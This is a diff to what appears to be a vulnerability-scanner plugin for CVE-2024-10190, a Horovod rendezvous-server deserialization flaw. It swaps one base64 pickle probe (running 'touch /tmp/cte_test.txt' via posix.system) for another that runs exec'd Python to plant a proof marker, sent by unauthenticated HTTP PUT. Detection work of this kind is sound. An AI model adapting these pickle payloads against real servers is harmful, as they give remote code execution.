@@ -19,8 +19,8 @@ finding: {
   }
   severity: CRITICAL
   title: "Horovod Insecure Deserialization Rendezvous Server RCE"
-  description: "An insecure deserialization vulnerability exists in Horovod versions up to 0.28.1 within the HTTP key-value store and rendezvous handler components (KVStoreHandler). Unauthenticated attackers can send serialized cloudpickle payloads via HTTP PUT requests to arbitrary scopes/keys, leading to remote code execution."
-  recommendation: "Upgrade Horovod to version 0.28.2 or later, restrict access to rendezvous and coordination ports via network segmentation, and avoid pickle-based serialization for network transport."
+  description: "An insecure deserialization vulnerability exists in Horovod versions up to and including 0.28.1 within the ElasticRendezvousHandler component. Unauthenticated attackers can send serialized cloudpickle payloads via HTTP PUT requests to the worker_addresses scope, leading to remote code execution."
+  recommendation: "At the time of this plugin's writing, 0.28.1 is the latest version, and the Github repository is archived. Due to that, the only simple solutions are to restrict network access to the rendezvous and coordination ports or stop using Horovod."
   related_id: {
     publisher: "CVE"
     value: "CVE-2024-10190"
@@ -50,14 +50,17 @@ actions: {
 }
 
 actions: {
-  name: "probe_kvstore_insecure_deserialization"
+  name: "probe_deserialization"
   http_request: {
     method: PUT
-    uri: "/cve_test_scope/probe_key"
+    uri: "/worker_addresses/localhost:0"
     headers: [
-      { name: "Content-Type" value: "application/octet-stream" }
+      {
+        name: "Content-Type"
+        value: "application/octet-stream"
+      }
     ]
-    data: "gAWVQQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlIwMdG91Y2ggL3RtcC9jdGVfdGVzdC50eHSFlFKULg=="
+    data: "gASVJAEAAAAAAABdlIwIYnVpbHRpbnOUjARleGVjlJOUWAEBAAAKaW1wb3J0IGluc3BlY3QKZiA9IGluc3BlY3QuY3VycmVudGZyYW1lKCkKd2hpbGUgZjoKICAgIGlmICJzZWxmIiBpbiBmLmZfbG9jYWxzIGFuZCBoYXNhdHRyKGYuZl9sb2NhbHNbInNlbGYiXSwgInNlcnZlciIpOgogICAgICAgIGYuZl9sb2NhbHNbInNlbGYiXS5zZXJ2ZXIuY2FjaGVbImN2ZV8yMDI0XzEwMTkwIl0gPSB7InByb29mIjogYiJDVkUtMjAyNC0xMDE5MF9SQ0VfQ09ORklSTUVEIn0KICAgICAgICBicmVhawogICAgZiA9IGYuZl9iYWNrCpSFlFKUhpQu"
     response: {
       http_status: 200
     }
@@ -65,15 +68,15 @@ actions: {
 }
 
 actions: {
-  name: "verify_key_stored"
+  name: "verify_deserialization_execution"
   http_request: {
     method: GET
-    uri: "/cve_test_scope/probe_key"
+    uri: "/cve_2024_10190/proof"
     response: {
       http_status: 200
       expect_all: {
         conditions: [
-          { body: {} contains: "gAWVQQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlIwMdG91Y2gg" }
+          { body: {} contains: "CVE-2024-10190_RCE_CONFIRMED" }
         ]
       }
     }
@@ -87,7 +90,7 @@ actions: {
 workflows: {
   actions: [
     "fingerprint_horovod_rendezvous",
-    "probe_kvstore_insecure_deserialization",
-    "verify_key_stored"
+    "probe_deserialization",
+    "verify_deserialization_execution"
   ]
 }
